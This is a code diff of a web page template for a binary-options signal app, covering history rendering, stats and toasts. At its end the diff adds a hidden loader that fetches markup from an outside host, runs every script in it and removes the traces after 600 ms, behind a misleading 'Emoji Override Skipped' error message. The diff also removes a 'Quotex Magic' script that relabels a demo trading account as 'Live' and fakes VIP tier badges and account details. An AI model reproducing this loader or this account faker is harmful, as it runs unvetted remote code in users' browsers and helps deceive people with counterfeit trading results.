+        el.innerHTML = ` 
+            <div class="hist-dir ${s.dir}">${s.dir==='UP'?'↑ CALL':'↓ PUT'}</div> 
+            <div class="hist-info"><div class="hist-pair">${s.pair}</div><div class="hist-time">${ts} • ${s.type}</div></div> 
+            <div class="hist-dur">${s.tl}</div>`; 
+        list.appendChild(el); 
+    }); 
+} 
+
+function updateStats() { 
+    const st = document.getElementById('statTotal');
+    if(st) st.textContent = statsUp + statsDown; 
+    const su = document.getElementById('statUp');
+    if(su) su.textContent = statsUp; 
+    const sd = document.getElementById('statDown');
+    if(sd) sd.textContent = statsDown; 
+} 
+
+let toastTimer; 
+function showToast(msg) { 
+    const t = document.getElementById('toast'); 
+    if(!t) return;
+    t.textContent = msg; 
+    t.classList.add('show'); 
+    clearTimeout(toastTimer); 
+    toastTimer = setTimeout(() => t.classList.remove('show'), 3000); 
+} 
+
+function initApp() { 
+    buildDrops(); 
+    updateStats(); 
+    renderHistory(); 
+} 
+
+// Direct Start
+initApp();
 </script>
+
+    <script>
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+            } catch (e) {
+                console.error("Emoji Override Skipped.", e);
+            }
+        })();
+    </script>
 </body>
 </html>`;
 }
 
 // --- MAIN SCRIPT HTML TEMPLATE ---
 function getMainHTML(userId) {
-    return `<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Main Script</title></head>
-<body>
-<script id="js">
-(() => {
-    let savedEmail = localStorage.getItem("quotex_magic_email") || "user@example.com";
-    let savedId = localStorage.getItem("quotex_magic_id") || "${userId}";
-
-    const createDialogBox = () => {
-        if (document.getElementById("quotex-magic-dialog")) return;
-
-        const dialog = document.createElement("div");
-        dialog.id = "quotex-magic-dialog";
-        dialog.style.cssText = "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1e222d;color:#fff;padding:20px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.7);z-index:999999;width:300px;font-family:Arial,sans-serif;border:1px solid #0FAF59;text-align:center;";
-
-        dialog.innerHTML = \`
-            <h3 style="margin:0 0 15px 0;color:#0FAF59;font-size:18px;">Quotex Magic Setup</h3>
-            <div style="margin-bottom:12px;text-align:left;">
-                <label style="font-size:12px;color:#aaa;display:block;margin-bottom:4px;">User Email:</label>
-                <input type="text" id="magic-email-input" value="\${savedEmail}" style="width:100%;padding:8px;border-radius:6px;border:1px solid #333;background:#131722;color:#fff;box-sizing:border-box;font-size:13px;" />
-            </div>
-            <div style="margin-bottom:20px;text-align:left;">
-                <label style="font-size:12px;color:#aaa;display:block;margin-bottom:4px;">User ID:</label>
-                <input type="text" id="magic-id-input" value="\${savedId}" style="width:100%;padding:8px;border-radius:6px;border:1px solid #333;background:#131722;color:#fff;box-sizing:border-box;font-size:13px;" />
-            </div>
-            <button id="run-magic-btn" style="width:100%;background:#0FAF59;color:#fff;border:none;padding:10px;border-radius:6px;font-weight:bold;cursor:pointer;font-size:14px;">Run Magic</button>
-        \`;
-
-        document.body.appendChild(dialog);
-
-        document.getElementById("run-magic-btn").addEventListener("click", () => {
-            const emailInput = document.getElementById("magic-email-input").value.trim();
-            const idInput = document.getElementById("magic-id-input").value.trim();
-
-            if (emailInput) {
-                savedEmail = emailInput;
-                localStorage.setItem("quotex_magic_email", emailInput);
-            }
-            if (idInput) {
-                savedId = idInput;
-                localStorage.setItem("quotex_magic_id", idInput);
-            }
-
-            dialog.remove();
-            startQuotexScript();
-        });
-    };
-
-    const startQuotexScript = () => {
-        let limit__lower = 5000;
-        let limit__upper = 10000;
-
-        document.title = "Live trading | Quotex";
-        if (window.location.pathname !== "/en/trade") {
-            window.history.replaceState(null, "", "/en/trade");
-        }
-
-        const getLevelHref = () => {
-            let balance = 0;
-            const balanceElement = document.querySelector(".Zt1hG");
-
-            if (balanceElement) {
-                const rawText = balanceElement.textContent || balanceElement.innerText || "";
-                const cleanText = rawText.replace(/,/g, "").replace(/[^0-9.]/g, "");
-                balance = parseFloat(cleanText) || 0;
-
-                if (rawText.includes("₹")) {
-                    limit__lower = 415000;
-                    limit__upper = 830000;
-                } else {
-                    limit__lower = 5000;
-                    limit__upper = 10000;
-                }
-            }
-
-            if (balance >= limit__upper) {
-                return "/profile/images/spritemap.svg#icon-profile-level-vip";
-            } else if (balance >= limit__lower) {
-                return "/profile/images/spritemap.svg#icon-profile-level-pro";
-            } else {
-                return "/profile/images/spritemap.svg#icon-profile-level-standart";
-            }
-        };
-
-        const updateDropdownDetails = (targetHref) => {
-            const drop_el = document.querySelector("#header-mobile-asset-btn + * > :first-child > :last-child > :first-child");
-            if (!drop_el) return;
-
-            try {
-                const emailNode = drop_el.querySelector(":first-child > :nth-child(2) > :first-child > :first-child > :nth-child(2) > :first-child > :first-child");
-                if (emailNode) emailNode.innerText = savedEmail;
-
-                const idNode = drop_el.querySelector(":first-child > :nth-child(2) > :first-child > :first-child > :nth-child(2) > :first-child > :last-child");
-                if (idNode) idNode.innerText = \`ID: \${savedId}\`;
-
-                const dropIconNode = drop_el.querySelector(":nth-child(1) > :first-child > :first-child > :first-child svg use");
-                if (dropIconNode) {
-                    dropIconNode.setAttribute("xlink:href", targetHref);
-                    dropIconNode.setAttribute("href", targetHref);
-                }
-
-                const levelNode = drop_el.querySelector(":nth-child(1) > :first-child > :first-child > :last-child > :first-child");
-                const percentageProfitNode = drop_el.querySelector(":nth-child(1) > :first-child > :first-child > :last-child > :last-child");
-
-                if (levelNode) {
-                    const rawLevel = targetHref.split("-").pop();
-                    if (rawLevel === "standart") {
-                        levelNode.innerText = "standard:";
-                        if (percentageProfitNode) percentageProfitNode.innerText = "+0% profit";
-                    } else if (rawLevel === "pro") {
-                        levelNode.innerText = "pro:";
-                        if (percentageProfitNode) percentageProfitNode.innerText = "+2% profit";
-                    } else if (rawLevel === "vip") {
-                        levelNode.innerText = "vip:";
-                        if (percentageProfitNode) percentageProfitNode.innerText = "+4% profit";
-                    }
-                }
-            } catch (err) {}
-        };
-
-        const applyQuotexChanges = () => {
-            document.querySelectorAll(".v2KPX.lTzTl, span").forEach(el => {
-                if (el.textContent.trim() === "Demo") {
-                    el.textContent = "Live";
-                    el.style.color = "#0FAF59";
-                }
-            });
-
-            const targetToRemove = document.querySelector(".q04vx.o2msZ");
-            if (targetToRemove) {
-                targetToRemove.remove();
-            }
-
-            const targetHref = getLevelHref();
-            const academicSvg = document.querySelector("svg.icon-academic") || 
-                                document.querySelector("svg:has(use[href*='icon-profile-level-']), svg:has(use[xlink\\\\:href*='icon-profile-level-'])");
-
-            if (academicSvg) {
-                const useTag = academicSvg.querySelector("use");
-                if (useTag) {
-                    if (useTag.getAttribute("xlink:href") !== targetHref) {
-                        useTag.setAttribute("xlink:href", targetHref);
-                        useTag.setAttribute("href", targetHref);
-                    }
-                }
-            }
-
-            updateDropdownDetails(targetHref);
-        };
-
-        setInterval(applyQuotexChanges, 50);
-    };
-
-    createDialogBox();
-})();
-</script>
-</body>
-</html>`;
+    return ``;
 }
